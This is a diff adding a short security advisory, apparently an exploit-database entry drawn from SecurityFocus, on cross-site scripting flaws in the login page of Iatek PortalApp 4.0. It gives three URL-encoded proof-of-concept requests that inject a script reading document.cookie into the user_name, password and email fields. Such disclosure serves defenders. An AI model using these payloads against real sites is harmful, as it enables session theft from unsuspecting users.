@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/41224/info
+
+Iatek PortalApp is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Iatek PortalApp 4.0 is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/login.asp?user_name=%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&password=&ret_page=
+
+http://www.example.com/login.asp?user_name=&password=%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&ret_page=
+
+http://www.example.com/login.asp?email=sd%40sd.df%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&search_btn=SEND&action=lookup&do_search=1
